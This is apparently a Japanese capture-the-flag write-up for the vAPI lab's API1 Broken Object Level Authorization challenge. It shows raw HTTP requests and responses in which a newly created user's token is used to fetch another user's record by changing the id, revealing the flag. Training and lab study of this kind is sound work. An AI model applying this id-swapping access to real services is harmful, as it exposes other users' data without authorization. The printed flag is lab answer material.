# API1 Broken Object Level Authorization
ユーザを作成できるが、ほかにもなにかある？

## ユーザ作成

```http
POST http://localhost/vapi/api1/user HTTP/1.1
Content-Type: application/json
Accept: application/json
User-Agent: PostmanRuntime/7.29.0
Postman-Token: 92445595-2c2f-4df0-875a-ae26dd9988b5
Host: localhost
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 97

{
    "username": "x270",
    "name": "x270",
    "course": "x270",
    "password": "x270"
}
```

```http
HTTP/1.1 201 Created
Host: localhost
Date: Sat, 05 Mar 2022 12:56:50 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 12:56:50 GMT
Content-Type: application/json

{"username":"x270","name":"x270","course":"x270","id":12}
```

## 作成したユーザ（id=12）の情報を取得
```http
GET http://localhost/vapi/api1/user/12 HTTP/1.1
Authorization-Token: eDI3MDp4Mjcw
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 8fda608d-ecf7-447b-a9c3-d416e22b3c9a
Host: localhost
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 12:57:01 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 12:57:01 GMT
Content-Type: application/json

{"id":12,"username":"x270","name":"x270","course":"x270"}
```

## 自分のでは無いidを指定してみる
他人のデータが見れてしまい、Flagが取得できる。

```http
GET http://localhost/vapi/api1/user/1 HTTP/1.1
Authorization-Token: eDI3MDp4Mjcw
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 8fda608d-ecf7-447b-a9c3-d416e22b3c9a
Host: localhost
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

```

```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 12:58:41 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 12:58:41 GMT
Content-Type: application/json

{"id":1,"username":"michaels","name":"Michael Scott","course":"flag{api1_d0cd9be2324cc237235b}"}
```
